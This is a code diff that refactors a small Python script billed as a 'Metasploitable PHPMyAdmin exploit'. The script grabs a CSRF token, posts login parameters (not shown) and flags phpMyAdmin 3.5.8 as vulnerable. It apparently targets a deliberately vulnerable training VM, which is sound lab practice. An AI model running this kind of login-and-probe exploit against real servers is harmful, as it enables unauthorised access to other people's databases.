@@ -4,20 +4,23 @@ import requests
 import argparse
 from bs4 import BeautifulSoup
 
+import logging
+log = logging.getLogger(__name__)
+
 
 class PHPMyAdmin:
-    def __init__(self, host, port):
-        self.__host = host
-        self.__port = port
+    def __init__(self):
+        self.__host = None
+        self.__port = 80
         self.__path = "/phpmyadmin/index.php"
         self.__token = None
         self.__requests = requests.session()
 
     def __csrf(self):
+        log.debug("[!] Getting CSRF Token")
         r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
         soup = BeautifulSoup(r.text, 'lxml')
         self.__token = soup.select_one('input[name="token"]')['value']
-        print(f"TOKEN: {self.__token}")
 
     def __exploit(self):
         params = {
@@ -28,27 +31,34 @@ class PHPMyAdmin:
         }
         r  = self.__requests.post(f"http://{self.__host}:{self.__port}{self.__path}", params=params)
         if r.status_code != 200:
+            log.info("[*] Error logging into PHPMyAdmin")
             return False
         soup = BeautifulSoup(r.text, 'lxml')
         title = soup.find("title").text
         if "phpMyAdmin 3.5.8" in title:
+            log.info("[!] PHPMyAdmin is vulnerable")
             return True
+        log.info("[!] PHPMyAdmin is secure")
         return False
 
-    def run(self):
+    def run(self, host, port=None):
+        self.__host = host
+        log.info(f"[*] Exploiting PHPMyAdmin ({self.__host})")
+        if port:
+            self.__port = port
         self.__csrf()
         return self.__exploit()
 
 
 def main(args):
-    print("[+] Metasploitable PHPMyAdmin exploit by xentrick")
-    print("[+] Exploiting " + args.host + ":" + args.port)
+    log.info("[+] Metasploitable PHPMyAdmin exploit by xentrick")
+    log.info("[+] Exploiting " + args.host + ":" + args.port)
 
-    exploit = PHPMyAdmin(args.host, int(args.port))
-    if exploit.run():
-        print("Target exploited")
+    exploit = PHPMyAdmin()
+    if exploit.run(args.host, int(args.port)):
+        log.info("Target exploited")
     else:
-        print("Exploit failed.")
+        log.info("Exploit failed.")
 
 
 if __name__ == "__main__":
